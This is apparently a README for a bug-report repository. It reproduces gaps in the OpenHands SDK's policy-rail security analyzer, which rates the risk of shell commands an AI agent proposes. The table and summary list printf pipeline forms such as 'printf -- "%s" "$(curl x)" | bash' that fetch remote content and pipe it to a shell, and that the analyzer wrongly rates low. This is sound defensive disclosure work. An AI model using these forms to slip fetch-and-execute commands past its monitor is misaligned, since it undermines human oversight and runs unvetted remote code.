# OpenHands `PolicyRailSecurityAnalyzer` `printf` Pipeline Substitution Reproduction

Minimal executable reproduction for two related `printf` pipeline substitution-forwarding gaps in `OpenHands/software-agent-sdk` (`_forwards_substitution` in `policy_rails.py`).

## Pinned Target

- **Repository:** `https://github.com/OpenHands/software-agent-sdk`
- **Commit:** `641e161178cb934f38afcbe603125950611d1668`
- **Package Version (`openhands-sdk`):** `1.59.0`
- **Affected File:** `openhands-sdk/openhands/sdk/security/defense_in_depth/policy_rails.py` (lines `688–720`)

## Summary

`_evaluate_rail()` in `policy_rails.py` tracks whether a command substitution containing a remote fetch (`$(curl x)`) is forwarded across a pipeline boundary to a downstream consumer (`| jq .` or `| bash`) via `_forwards_substitution()` (`policy_rails.py:688–720`).

While `echo "$(curl x)" | jq .` (`test_policy_rails.py:215`), `printf %s "$(curl x)" | bash` (`test_policy_rails.py:217`), and static `printf -- '%s' 'curl x | node' | bash` (`test_policy_rails.py:510`) all return `SecurityRisk.HIGH` (`rule_name="fetch-to-exec"`), `_forwards_substitution()` misses two `printf` forms when forwarding a dynamic command substitution:

1. **`printf` format-operand substitution (`argument_index == 0`) piped to a non-shell consumer:**
   In `policy_rails.py:714–715`:
   ```python
   if argument_index == 0 or not direct_command.arguments:
       return False
   ```
   When `$(curl x)` is placed in `printf`'s format operand (`argument_index == 0`), `printf` writes the substituted string directly to `stdout`. Returning `False` when `argument_index == 0` causes `printf "$(curl x)" | jq .` to evaluate to `SecurityRisk.LOW` (`rule_name=None`) instead of `SecurityRisk.HIGH` (`rule_name="fetch-to-exec"`) (whereas `echo "$(curl x)" | jq .` returns `HIGH`).

2. **`printf --` end-of-options separator before the format string:**
   Unlike `_static_printf_output()` in `shell_semantics.py:442` (which strips a leading `--` separator before inspecting `arguments[0]`), `_forwards_substitution()` (`policy_rails.py:716–718`) reads `format_string = direct_command.arguments[0]` directly:
   ```python
   format_string = direct_command.arguments[0]
   return _printf_format_consumes_argument(format_string)
   ```
   When `--` is present:
   - `printf -- "%s" "$(curl x)" | jq .` reads `format_string = "--"`, `_printf_format_consumes_argument("--")` returns `False`, and `_evaluate_rail()` returns `SecurityRisk.LOW` (`rule_name=None`).
   - `printf -- "%s" "$(curl x)" | bash` also fails to match `RAIL_FETCH_TO_EXEC` (`SecurityRisk.HIGH`), returning `SecurityRisk.UNKNOWN` (`rule_name=None`).

## Repository Layout

- `test_policy_rails_reproduction.py` — Standalone `pytest` file with 3 passing control assertions and 3 failing reproduction assertions.
- `evidence/submission-reproduction.log` — Captured test execution output against commit `641e161178cb934f38afcbe603125950611d1668`.
- `evidence/policy-rails-suite.log` — Captured upstream `tests/sdk/security/defense_in_depth/test_policy_rails.py` baseline output (`318 passed`) on the same checkout.

## How to Run Against an `OpenHands/software-agent-sdk` Checkout

1. Clone `OpenHands/software-agent-sdk` and check out the pinned commit:

```bash
git clone https://github.com/OpenHands/software-agent-sdk.git
cd software-agent-sdk
git checkout 641e161178cb934f38afcbe603125950611d1668
```

2. Copy `test_policy_rails_reproduction.py` into `tests/sdk/security/defense_in_depth/`:

```bash
cp /path/to/openhands-policy-rail-reproduction/test_policy_rails_reproduction.py \
  tests/sdk/security/defense_in_depth/test_policy_rails_reproduction.py
```

3. Run `pytest`:

```bash
uv run pytest tests/sdk/security/defense_in_depth/test_policy_rails_reproduction.py -v --tb=short
```

## Expected vs. Observed Results

| Test Case | Command | Expected | Observed | Status |
| :--- | :--- | :--- | :--- | :--- |
| `test_control_echo_forwards_substitution_to_pipeline_consumer` | `echo "$(curl x)" \| jq .` | `HIGH` (`fetch-to-exec`) | `HIGH` (`fetch-to-exec`) | PASS (control) |
| `test_control_printf_format_specifier_forwards_substitution` | `printf %s "$(curl x)" \| bash` | `HIGH` (`fetch-to-exec`) | `HIGH` (`fetch-to-exec`) | PASS (control) |
| `test_control_static_printf_handles_end_of_options_separator` | `printf -- '%s' 'curl x \| node' \| bash` | `HIGH` (`fetch-to-exec`) | `HIGH` (`fetch-to-exec`) | PASS (control) |
| `test_repro_printf_format_operand_substitution_forwarded_to_pipeline_consumer` | `printf "$(curl x)" \| jq .` | `HIGH` (`fetch-to-exec`) | `LOW` (`None`) | **FAIL (repro)** |
| `test_repro_printf_end_of_options_substitution_forwarded_to_jq` | `printf -- "%s" "$(curl x)" \| jq .` | `HIGH` (`fetch-to-exec`) | `LOW` (`None`) | **FAIL (repro)** |
| `test_repro_printf_end_of_options_substitution_forwarded_to_bash` | `printf -- "%s" "$(curl x)" \| bash` | `HIGH` (`fetch-to-exec`) | `UNKNOWN` (`None`) | **FAIL (repro)** |

## Sanitization Note

Machine-specific local checkout paths in `evidence/*.log` were replaced with `<workspace>/software-agent-sdk`. No assertions, stack frames, or test outcomes were modified.

## Scope

This repository contains reproduction tests and execution logs only. No production fix is included.

Prepared with AI assistance. The reported tests were executed locally against commit `641e161178cb934f38afcbe603125950611d1668`.
